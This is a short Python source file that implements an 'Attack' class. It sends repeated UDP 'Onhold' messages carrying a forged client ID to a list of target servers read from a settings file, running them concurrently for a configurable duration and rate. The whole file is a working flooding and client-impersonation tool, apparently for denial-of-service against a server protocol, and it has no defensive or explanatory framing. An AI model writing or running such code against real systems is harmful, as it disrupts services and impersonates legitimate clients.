# !/usr/bin/env python3
# -*- coding: utf-8 -*-

import asyncio
import socket
import time
import os
from utils.tools import load_settings


class Attack:
    def __init__(self):
        self.attackSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    async def send_udp_message(self, ip, port, message):
        destination = (ip, port)
        try:
            self.attackSocket.sendto(message.encode(), destination)
        except Exception as e:
            print(f"Error sending message: {e}")

    async def attackServer(self, ServerIP: str, ServerPort: int, guiseClientID: int, duration: float, strength: float):
        start_time = time.time()
        while True:

            message = f"Onhold {guiseClientID}"
            await self.send_udp_message(ServerIP, ServerPort, message)
            await asyncio.sleep(strength)

            elapsed_time = time.time() - start_time
            if elapsed_time >= duration:
                break

    async def startAttack(self):
        settings = load_settings(os.getcwd())
        tasks = []
        print(f"Starting attacks... {time.time()}")
        for ID, info in settings['AttackList'].items():
            ServerIP, ServerPort = info['ServerIP'], info['ServerPort']
            guiseClientID = info['guiseClientID']
            duration = info['duration']
            strength = info['strength']
            task = self.attackServer(ServerIP, ServerPort, guiseClientID, duration, strength)
            tasks.append(task)

        await asyncio.gather(*tasks)
        print("All attacks completed.")
